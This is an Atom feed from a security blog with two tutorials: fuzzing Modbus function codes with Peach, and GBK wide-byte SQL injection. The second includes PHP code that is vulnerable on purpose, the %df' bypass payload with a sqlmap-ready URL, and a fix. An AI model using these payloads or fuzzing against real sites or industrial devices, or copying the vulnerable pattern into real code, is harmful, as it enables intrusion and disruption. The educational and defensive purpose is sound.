<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Uknow’s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://uknowsec.cn/"/>
  <updated>2017-08-10T04:33:55.271Z</updated>
  <id>http://uknowsec.cn/</id>
  
  <author>
    <name>uknow</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Peach对Modbus功能码的模糊测试</title>
    <link href="http://uknowsec.cn/posts/notes/Peach%E5%AF%B9Modbus%E5%8A%9F%E8%83%BD%E7%A0%81%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95.html"/>
    <id>http://uknowsec.cn/posts/notes/Peach对Modbus功能码的模糊测试.html</id>
    <published>2017-08-10T01:48:08.000Z</published>
    <updated>2017-08-10T04:33:55.271Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Modbus功能码"><a href="#Modbus功能码" class="headerlink" title="Modbus功能码"></a>Modbus功能码</h3><table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:center">中文名称</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>01</td>
<td style="text-align:center">读取线圈状态</td>
<td style="text-align:center">取得一组逻辑线圈的当前状态（ON/OFF)</td>
</tr>
<tr>
<td>02</td>
<td style="text-align:center">读取输入状态</td>
<td style="text-align:center">取得一组开关输入的当前状态（ON/OFF)</td>
</tr>
<tr>
<td>03</td>
<td style="text-align:center">读取保持寄存器</td>
<td style="text-align:center">在一个或多个保持寄存器中取得当前的二进制值</td>
</tr>
<tr>
<td>04</td>
<td style="text-align:center">读取输入寄存器</td>
<td style="text-align:center">在一个或多个输入寄存器中取得当前的二进制值</td>
</tr>
<tr>
<td>05</td>
<td style="text-align:center">强置单线圈</td>
<td style="text-align:center">强置一个逻辑线圈的通断状态</td>
</tr>
<tr>
<td>06</td>
<td style="text-align:center">预置单寄存器</td>
<td style="text-align:center">把具体二进值装入一个保持寄存器</td>
</tr>
<tr>
<td>07</td>
<td style="text-align:center">读取异常状态</td>
<td style="text-align:center">取得8个内部线圈的通断状态，这8个线圈的地址由控制器决定，用户逻辑可以将这些线圈定义，以说明从机状态，短报文适宜于迅速读取状态</td>
</tr>
<tr>
<td>08</td>
<td style="text-align:center">回送诊断校验</td>
<td style="text-align:center">把诊断校验报文送从机，以对通信处理进行评鉴</td>
</tr>
<tr>
<td>09</td>
<td style="text-align:center">编程（只用于484）</td>
<td style="text-align:center">使主机模拟编程器作用，修改PC从机逻辑</td>
</tr>
<tr>
<td>10</td>
<td style="text-align:center">控询（只用于484）</td>
<td style="text-align:center">可使主机与一台正在执行长程序任务从机通信，探询该从机是否已完成其操作任务，仅在含有功能码9的报文发送后，本功能码才发送</td>
</tr>
<tr>
<td>11</td>
<td style="text-align:center">读取事件计数</td>
<td style="text-align:center">可使主机发出单询问，并随即判定操作是否成功，尤其是该命令或其他应答产生通信错误时</td>
</tr>
<tr>
<td>12</td>
<td style="text-align:center">读取通信事件记录</td>
<td style="text-align:center">可是主机检索每台从机的ModBus事务处理通信事件记录。如果某项事务处理完成，记录会给出有关错误</td>
</tr>
<tr>
<td>13</td>
<td style="text-align:center">编程（184/384 484 584）</td>
<td style="text-align:center">可使主机模拟编程器功能修改PC从机逻辑</td>
</tr>
<tr>
<td>14</td>
<td style="text-align:center">探询（184/384 484 584）</td>
<td style="text-align:center">可使主机与正在执行任务的从机通信，定期控询该从机是否已完成其程序操作，仅在含有功能13的报文发送后，本功能码才得发送</td>
</tr>
<tr>
<td>15</td>
<td style="text-align:center">强置多线圈</td>
<td style="text-align:center">强置一串连续逻辑线圈的通断</td>
</tr>
<tr>
<td>16</td>
<td style="text-align:center">预置多寄存器</td>
<td style="text-align:center">把具体的二进制值装入一串连续的保持寄存器</td>
</tr>
<tr>
<td>17</td>
<td style="text-align:center">报告从机标识</td>
<td style="text-align:center">可使主机判断编址从机的类型及该从机运行指示灯的状态</td>
</tr>
<tr>
<td>18</td>
<td style="text-align:center">（884和MICRO 84）</td>
<td style="text-align:center">可使主机模拟编程功能，修改PC状态逻辑</td>
</tr>
<tr>
<td>19</td>
<td style="text-align:center">重置通信链路</td>
<td style="text-align:center">发生非可修改错误后，是从机复位于已知状态，可重置顺序字节</td>
</tr>
<tr>
<td>20</td>
<td style="text-align:center">读取通用参数（584L）</td>
<td style="text-align:center">显示扩展存储器文件中的数据信息</td>
</tr>
<tr>
<td>21</td>
<td style="text-align:center">写入通用参数（584L）</td>
<td style="text-align:center">把通用参数写入扩展存储文件，或修改之</td>
</tr>
</tbody>
</table>
<h3 id="Peach简介"><a href="#Peach简介" class="headerlink" title="Peach简介"></a>Peach简介</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>Michael Eddington等人开发的Peach是一个遵守MIT开源许可证的模糊测试框架，最初采用Python语言编写，发布于2004年，第二版于2007年发布，最新的第三版使用C#重写了整个框架。</p>
<p>Peach支持对文件格式、ActiveX、网络协议、API等进行Fuzz测试；Peach Fuzz的关键是编写Peach Pit配置文件。</p>
<p>Windows下使用Peach3需要预先安装.net 4和windbg；Linux、OS X下需要安装Mono .net开发框架。</p>
<h4 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz1.png" alt=""></p>
<ul>
<li>-1：执行第1次测试。</li>
<li><p>-a：启动Peach代理。不指定”channel”默认为本地代理（默认支持，无需显式启动）；<br>“channel”可以指定为”tcp”远程代理。</p>
</li>
<li><p>-c：统计测试用例数。</p>
</li>
<li>-t：验证Peach Pit xml文件正确性。</li>
<li>-p：并行Fuzz。运行Peach的机器总数为M，这是第N个。</li>
<li>–debug：调试信息开关。</li>
<li>–skipto：指定Fuzz跳过的测试用例数。</li>
<li>–range：指定Fuzz的测试用例范围。</li>
</ul>
<h3 id="Peach-Pit"><a href="#Peach-Pit" class="headerlink" title="Peach Pit"></a>Peach Pit</h3><p>在使用Peach进行Fuzz之前需要编写被称为”Peach Pit”的xml配置文件，其中包含着如何进行Fuzz的关键信息，如下图：<br><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz2.png" alt=""></p>
<h3 id="peach模糊测试"><a href="#peach模糊测试" class="headerlink" title="peach模糊测试"></a>peach模糊测试</h3><p>在研究网络协议模糊测试时，sulley和peach两大框架是最常见的Fuzz框架，peach相对于sulley有以下几点优势：</p>
<ul>
<li>1、sulley目前已不再维护。</li>
<li>2、对sulley模糊测试编写程序，需要有一定的python语言基础。而peach是xml格式的，比较容易理解。</li>
<li>3、sulley配置环境相对繁琐，而peach配置环境相对简单（目前我手头有绿色版本，可以直接运行）。</li>
<li>4、sulley只能对网络协议进行模糊测试，而peach相对更加多样化。</li>
</ul>
<h2 id="Peach协议Fuzz"><a href="#Peach协议Fuzz" class="headerlink" title="Peach协议Fuzz"></a>Peach协议Fuzz</h2><h3 id="工作流程图"><a href="#工作流程图" class="headerlink" title="工作流程图"></a>工作流程图</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz3.png" alt=""></p>
<h4 id="流程图具体工作原理"><a href="#流程图具体工作原理" class="headerlink" title="流程图具体工作原理"></a>流程图具体工作原理</h4><ul>
<li>1、根据协议控制规范或者捕获工业控制网络协议数据流来构造正常的数据包；</li>
<li>2、分析正常协议的字段及其重要性；</li>
<li>3、根据分析的协议中不同的数据类型，设计有效地变异策略。</li>
<li>4、设计并实现工业控制网络协议数据包发包工具；</li>
<li>5、设计并实现代理器及监视器；</li>
<li>6、采用发包工具，将畸形数据包发送给被测工控目标；</li>
<li>7、通过监视器探测被测工控目标异常数据记录。</li>
</ul>
<h3 id="NetWork-xml简单分析"><a href="#NetWork-xml简单分析" class="headerlink" title="NetWork.xml简单分析"></a>NetWork.xml简单分析</h3><p>在Peach的目录里有个samples目录,里面有官方给出的一些Pit，以NetWork.xml文件为例做一个简单的分析，具体如下：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz4.png" alt=""></p>
<h3 id="Modbus-Fuzz-Pit编写"><a href="#Modbus-Fuzz-Pit编写" class="headerlink" title="Modbus Fuzz Pit编写"></a>Modbus Fuzz Pit编写</h3><p>由于是初次接触Peach对Modbus工控协议的模糊测试，目前也对Modbus协议不是很熟悉，所以只能在网络上找个各种资料。<br>经过一番寻找，最终在github上找到了一份Pit，就是关于对modbus功能码的Fuzz Peach Pit。文章Reference处给出链接。<br>简单地阅读和分析这个Pit发现，这个Pit对01 02 03 04 05 06 15 16 20 21 22 23 24 这几个功能进行Fuzz。除了22 23 24这几个功能码没有在文章开头提到，其他都在基础知识中有。关于22 23 24三个功能码具体如下</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:center">作用描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td style="text-align:center">屏蔽写寄存器</td>
</tr>
<tr>
<td>23</td>
<td style="text-align:center">读/写多个寄存器</td>
</tr>
<tr>
<td>24</td>
<td style="text-align:center">读FIFO队列</td>
</tr>
</tbody>
</table>
<p>另外发现，在我们找到的Pit中，缺少了Agents-Monitors部分即监听器模块部分。Agents部分可以在本地或远程运行，可以执行附加调试器的动作，看内存消耗，检测故障等。<br>查看官方文档可以知道Peach Fuzz根据不同的环境类型支持以下几种Monitors</p>
<p>Windows Monitors</p>
<ul>
<li>Windows Debugger Monitor</li>
<li>Cleanup Registry Monitor</li>
<li>Page Heap Monitor</li>
<li>Popup Watcher Monitor</li>
<li>Windows Service Monitor</li>
</ul>
<p>OS X Monitors</p>
<ul>
<li>OS X Crash Wrangler Monitor</li>
<li>OS X Crash Reporter Monitor</li>
</ul>
<p>Linux Monitors</p>
<ul>
<li>Linux Crash Monitor</li>
</ul>
<p>Cross Platform Monitors</p>
<ul>
<li>CanaKit Relay Monitor</li>
<li>Cleanup Folder Monitor</li>
<li>IpPower9258 Monitor</li>
<li>Memory Monitor</li>
<li>Pcap Network Monitor</li>
<li>Ping Monitor</li>
<li>Process Launcher Monitor</li>
<li>Process Killer Monitor</li>
<li>Save File Monitor</li>
<li>Socket Listener Monitor</li>
<li>SSH Monitor</li>
<li>SSH Downloader Monitor</li>
<li>Vmware Control Monitor</li>
</ul>
<p>由于我们是对Modbus工控协议的模糊测试，这里我们可以用常见的Ping Monitor和Socket Listener Monitor。经过向一些之前有过Modbus Peach Fuzz研究的前辈的请教，得到结果是用Ping Monitor的误报率比较高，所以我们在编写是使用的是Socket Listener Monitor。</p>
<p>以下给出Ping Monitor和Socket Listener Monitor的编写模板</p>
<h4 id="Ping-Monitor"><a href="#Ping-Monitor" class="headerlink" title="Ping Monitor"></a>Ping Monitor</h4><p>Parameters</p>
<ul>
<li>Host — Hostname or IP address</li>
<li>Timeout — Timeout in milliseconds (optional, defaults to 1,000)</li>
<li>Data — Data to send in ping packet (optional)</li>
<li>FaultOnSuccess — Fault if ping is successful (optional, defaults to false)</li>
</ul>
<p>Examples<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Agent name=&quot;Local&quot;&gt;</div><div class="line">        &lt;Monitor class=&quot;Ping&quot;&gt;</div><div class="line">                &lt;Param name=&quot;Host&quot; value=&quot;www.google.com&quot; /&gt;</div><div class="line">        &lt;/Monitor&gt;</div><div class="line">&lt;/Agent&gt;</div></pre></td></tr></table></figure></p>
<h4 id="Socket-Monitor"><a href="#Socket-Monitor" class="headerlink" title="Socket Monitor"></a>Socket Monitor</h4><p>Parameters</p>
<ul>
<li>Host — IP address of remote host (optional, defaults to “”)</li>
<li>Interface — IP address of interface to listen on (optional, defaults to 0.0.0.0)</li>
<li>Port — Port to listen on (optional, defaults to 8080)</li>
<li>Protocol — Protocol type to listen for (optional, defaults to tcp)</li>
<li>Timeout — Length of time to wait for incoming connection (optional, defaults to 1000 ms)</li>
<li>FaultOnSuccess — Fault if no conection is recorded (optional, defaults to false)</li>
</ul>
<p>Examples<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;Agent name=&quot;Local&quot;&gt;</div><div class="line">        &lt;Monitor class=&quot;Socket&quot;&gt;</div><div class="line">                &lt;Param name=&quot;Port&quot; value=&quot;53&quot; /&gt;</div><div class="line">        &lt;/Monitor&gt;</div><div class="line">&lt;/Agent&gt;</div></pre></td></tr></table></figure></p>
<p>由官方文档最终得到如下Agent<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;Agent name=&quot;Local&quot;&gt;</div><div class="line">       &lt;Monitor class=&quot;Socket&quot;&gt;</div><div class="line">			&lt;Param name=&quot;Host&quot; value=&quot;192.168.1.100&quot; /&gt;</div><div class="line">			&lt;Param name=&quot;Port&quot; value=&quot;502&quot; /&gt;</div><div class="line">       &lt;/Monitor&gt;</div><div class="line">&lt;/Agent&gt;</div></pre></td></tr></table></figure></p>
<p>在TEST模块里引用Agent模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;Test name=&quot;Default&quot;&gt;</div><div class="line">	&lt;StateModel ref=&quot;ModbusStateModel&quot; /&gt;</div><div class="line">	</div><div class="line">	&lt;Agent ref=&quot;Local&quot; /&gt;</div><div class="line">	</div><div class="line">	&lt;Logger class=&quot;File&quot;&gt;</div><div class="line">		&lt;Param name=&quot;Path&quot; value=&quot;c:\log1&quot;/&gt;</div><div class="line">	&lt;/Logger&gt;</div><div class="line">	&lt;Publisher class=&quot;tcp.Tcp&quot;&gt;</div><div class="line">		&lt;Param name=&quot;Host&quot; value=&quot;192.168.1.100&quot;/&gt;</div><div class="line">		&lt;Param name=&quot;Port&quot; value=&quot;502&quot;/&gt;</div><div class="line">	&lt;/Publisher&gt;</div><div class="line">&lt;/Test&gt;</div></pre></td></tr></table></figure></p>
<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><p>先简单的说明下这个Pit的基本原理就是给工控设备发送合法的功能码，然后对数据部分进行变异。在这个过程用监听器监听，如果出现崩溃就会出现崩溃日志。这个过程是很漫长的过程，经过我跟Modbus Peach Fuzz的前辈进行的交流，得知他们的模糊测试点都是经过逆向找到的，所以Pit是不能发给我的。而我们这边目前只能对功能码进行模糊测试。据我了解对Modbus协议的模糊测试，需要先提取固件，然后对固件逆向分析，找到模糊测试的点，国内做的很少。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/peachfuzz5.png" alt=""></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/jseidl/peach-pit" target="_blank" rel="external">Github Peach Fuzzer PIT Files</a><br><a href="http://community.peachfuzzer.com/v3/PeachPit.html" target="_blank" rel="external">PeachPit官方文档</a><br><a href="http://blog.nsfocus.net/peach-fuzz/" target="_blank" rel="external">浅析Peach Fuzz</a><br><a href="http://www.freebuf.com/articles/security-management/88249.html" target="_blank" rel="external">工控网络协议模糊测试：用peach对modbus协议进行模糊测试</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>宽字节注入漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/宽字节注入漏洞的利用与学习.html</id>
    <published>2017-08-01T01:30:37.000Z</published>
    <updated>2017-08-01T04:43:01.067Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="字符、字符集与字符序"><a href="#字符、字符集与字符序" class="headerlink" title="字符、字符集与字符序"></a>字符、字符集与字符序</h3><p>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p>
<p>字符序(collation)指同一字符集内字符间的比较规则。</p>
<h3 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象。</p>
<h3 id="GBK编码取值范围"><a href="#GBK编码取值范围" class="headerlink" title="GBK编码取值范围"></a>GBK编码取值范围</h3><p>GBK采用双字节表示，总体编码范围为8140-FEFE，首字节在81-FE 之间，尾字节在40-FE 之间</p>
<h3 id="GB2313编码取值范围"><a href="#GB2313编码取值范围" class="headerlink" title="GB2313编码取值范围"></a>GB2313编码取值范围</h3><p>gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE</p>
<h3 id="MYSQL的字符集转换过程"><a href="#MYSQL的字符集转换过程" class="headerlink" title="MYSQL的字符集转换过程"></a>MYSQL的字符集转换过程</h3><ol>
<li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;</p>
</li>
<li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p>
</li>
</ol>
<ul>
<li>使用每个数据字段的CHARACTER SET设定值;</li>
<li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准);</li>
<li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值;</li>
<li>若上述值不存在，则使用character_set_server设定值。</li>
</ul>
<p>将操作结果从内部操作字符集转换为character_set_results。</p>
<p>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。</p>
<h3 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">addslashes(string)</div></pre></td></tr></table></figure>
<h4 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
</tbody>
</table>
<h3 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string()"></a>mysql_real_escape_string()</h3><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">\x00</div><div class="line">\n</div><div class="line">\r</div><div class="line">\</div><div class="line">&apos;</div><div class="line">&quot;</div><div class="line">\x1a</div><div class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</div></pre></td></tr></table></figure>
<h4 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql_real_escape_string(string,connection)</div></pre></td></tr></table></figure>
<h4 id="参数说明：-1"><a href="#参数说明：-1" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
<tr>
<td>connection</td>
<td style="text-align:center">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
</tr>
</tbody>
</table>
<h3 id="incov"><a href="#incov" class="headerlink" title="incov()"></a>incov()</h3><p>(PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)<br>iconv — 字符串按要求的字符编码来转换</p>
<h4 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">string iconv ( string $in_charset , string $out_charset , string $str )</div></pre></td></tr></table></figure>
<p>将字符串 str 从 in_charset 转换编码到 out_charset。</p>
<h4 id="参数说明：-2"><a href="#参数说明：-2" class="headerlink" title="参数说明："></a>参数说明：</h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>in_charset</td>
<td style="text-align:center">输入的字符集。</td>
</tr>
<tr>
<td>out_charset</td>
<td style="text-align:center">输出的字符集。</td>
</tr>
<tr>
<td>str</td>
<td style="text-align:center">要转换的字符串。</td>
</tr>
</tbody>
</table>
<h3 id="相关字符集设置"><a href="#相关字符集设置" class="headerlink" title="相关字符集设置"></a>相关字符集设置</h3><ul>
<li>character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。</li>
<li>character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。</li>
<li>character_set_database:数据库缺省编码字符集。</li>
<li>character_set_filesystem:文件系统编码字符集。</li>
<li>character_set_results:SQL语句执行结果编码字符集。</li>
<li>character_set_server:服务器缺省编码字符集。</li>
<li>character_set_system:系统缺省编码字符集。</li>
<li>character_sets_dir:字符集存放目录，一般不要修改</li>
</ul>
<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>　　GBK 占用两字节</p>
<p>　　ASCII占用一字节</p>
<p>　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。</p>
<p>　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。</p>
<p>　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\’” ，“\”既URL里的“%5C”，那么也就是说，“%DF’”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”</p>
<h2 id="MySQL中的宽字节注入"><a href="#MySQL中的宽字节注入" class="headerlink" title="MySQL中的宽字节注入"></a>MySQL中的宽字节注入</h2><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//连接数据库部分，注意使用了gbk编码</div><div class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;uknow&apos;) or die(&apos;bad!&apos;);</div><div class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);</div><div class="line">mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</div><div class="line">//执行sql语句</div><div class="line">$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;</div><div class="line">$sql = &quot;SELECT * FROM news WHERE tid=&apos;&#123;$id&#125;&apos;&quot;;</div><div class="line">$result = mysql_query($sql, $conn) or die(mysql_error());</div><div class="line">?&gt;</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=&quot;gbk&quot; /&gt;</div><div class="line">&lt;title&gt;新闻&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php</div><div class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</div><div class="line">echo &quot;&lt;h2&gt;&#123;$row[&apos;title&apos;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&apos;content&apos;]&#125;&lt;p&gt;\n&quot;;</div><div class="line">mysql_free_result($result);</div><div class="line">?&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>SQL语句是SELECT * FROM news WHERE tid=’{$id}’，就是根据文章的id把文章从news表中取出来。</p>
<p>在这个sql语句前面，使用了一个addslashes函数，将$id的值转义。这是通常cms中对sql注入进行的操作，只要输入参数在单引号中，就逃逸不出单引号的限制，无法注入，</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql1.png" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/sql2.png" alt=""></p>
<p>一般绕过addslashes的方式就是，想办法处理\’前面的\：</p>
<ul>
<li>1.想办法给\前面再加一个\（或单数个即可），变成\’，这样\被转义了，’逃出了限制</li>
<li>2.想办法把\弄没有。<br>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）。如果输入%df’看会怎样：</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql3.png" alt=""><br>其中的�\是一个汉字  我们可以改成其他的。根据gbk编码，第一个字节ascii码大于128，基本上就可以了。比如我们不用%df，用%dd也可以：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql4.png" alt=""></p>
<p>为什么从刚才到现在，只是在’也就是%27前面加了一个%df就报错了？而且从图中可以看到，报错的原因就是多了一个单引号，而单引号前面的反斜杠不见了。</p>
<p>这就是mysql的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“輁”，而’逃逸了出来。</p>
<p>因为两个字节代表一个汉字，所以我们可以试试%df%df%27：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql5.png" alt=""></p>
<p>不报错了。因为%df%df是一个汉字，%5c%27不是汉字，仍然是\’。</p>
<p>我们可以利用宽字节注入的特点进行手注，也可以在url后面加上%df’丢给sqlmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/1/0x01/index.php?id=1%df&apos;</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql6.png" alt=""></p>
<h2 id="GB2312与GBK的不同"><a href="#GB2312与GBK的不同" class="headerlink" title="GB2312与GBK的不同"></a>GB2312与GBK的不同</h2><p>GB2312也是属于宽字节，那么使用GB2312连接数据库，看能否进行宽字节注入</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql7.png" alt=""></p>
<p>结果就是不能注入了：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql8.png" alt=""></p>
<p>gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。</p>
<h2 id="宽字符注入的修复"><a href="#宽字符注入的修复" class="headerlink" title="宽字符注入的修复"></a>宽字符注入的修复</h2><ul>
<li>将character_set_client设置为binary（二进制）<br>只需在所有sql语句前指定一下连接的形式是二进制：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</div></pre></td></tr></table></figure>
</li>
</ul>
<p>当mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p>
<p>然后，当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p>
<p>所以，将character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/sql10.png" alt=""></p>
<p>已经不能注入了<br><img src="http://obr4sfdq7.bkt.clouddn.com/sql9.png" alt=""></p>
